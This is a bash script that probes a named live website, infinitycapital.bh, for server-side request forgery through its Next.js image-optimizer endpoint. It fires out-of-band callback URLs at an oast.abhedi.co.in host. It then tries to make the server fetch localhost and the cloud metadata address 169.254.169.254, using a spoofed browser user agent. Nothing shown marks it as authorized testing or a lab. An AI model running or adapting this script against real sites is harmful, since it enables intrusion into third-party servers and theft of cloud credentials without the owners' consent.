#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
B="https://www.infinitycapital.bh"
O="oob23d45c2f3dfe.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
enc() { python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$1"; }
# Fire the OOB probe on the live image-optimizer fetch sink
for u in "http://$O/ssrf-img.png" "https://$O/ssrf-img2.png"; do
  e=$(enc "$u")
  code=$(curl -s -A "$UA" -o /tmp/o.bin -w "%{http_code}" --max-time 40 "$B/_next/image?url=$e&w=640&q=75")
  echo "OOB-FIRE $u -> $code  body: $(head -c 100 /tmp/o.bin)"
done
echo "=== error bodies ==="
e=$(enc "http://127.0.0.1:80/")
curl -s -A "$UA" --max-time 40 "$B/_next/image?url=$e&w=640&q=75"; echo
e=$(enc "http://169.254.169.254/latest/meta-data/")
curl -s -A "$UA" --max-time 40 "$B/_next/image?url=$e&w=640&q=75"; echo
